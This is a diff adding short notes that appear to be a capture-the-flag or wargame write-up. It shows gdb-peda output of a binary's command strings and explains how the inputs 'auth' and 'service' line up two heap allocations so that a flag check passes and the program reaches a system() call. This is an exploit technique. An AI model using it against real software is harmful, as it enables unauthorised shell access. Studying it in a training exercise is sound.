@@ -1,0 +1,25 @@
+gdb-peda$ p (char *)0x8048819
+$1 = 0x8048819 "auth "
+
+gdb-peda$ p (char *)0x804881f
+$7 = 0x804881f "reset"
+
+gdb-peda$ p (char *)0x8048825
+$8 = 0x8048825 "service"
+
+gdb-peda$ p (char *)0x804882d
+$9 = 0x804882d "login"
+
+gdb-peda$ p (char *)0x804883b
+$6 = 0x804883b "Password:\n"
+
+looking at the source, using once 
+
+	"auth 0123456789012345679"
+
+	will make the str allocated
+
+	then, " service 4444444444444444444444444444" will allocate the rest of the heap in s2 with str2 = str + 16
+	so that str[32] is mapped into memory and is equal to 0x54
+
+	then str[32] != 0 and we get the system call !
